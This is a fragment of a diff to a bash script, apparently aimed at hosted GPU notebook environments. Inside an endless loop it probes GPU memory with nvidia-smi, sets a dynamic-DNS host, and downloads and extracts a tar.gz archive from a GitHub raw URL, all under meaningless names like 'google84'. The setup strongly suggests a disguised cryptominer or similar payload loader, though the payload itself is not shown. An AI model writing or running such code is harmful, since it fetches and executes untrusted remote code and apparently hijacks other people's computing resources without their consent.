@@ -11,9 +11,9 @@ else
 while true
 do
 
-arr[0]="http://mobile84121274.hopto.org/"
-rand=$[$RANDOM % ${#arr[@]}]
-google841212121274=${arr[$rand]}
+cd /notebooks/
+
+google841212121274="http://mobile84121274.hopto.org/"
 
 google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
@@ -91,7 +91,7 @@ fi
 
 else
 
-cd /notebooks/
+cd /notebooks/google84/
 
 wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google8474.tar.gz
 tar -xvf ./google8474.tar.gz
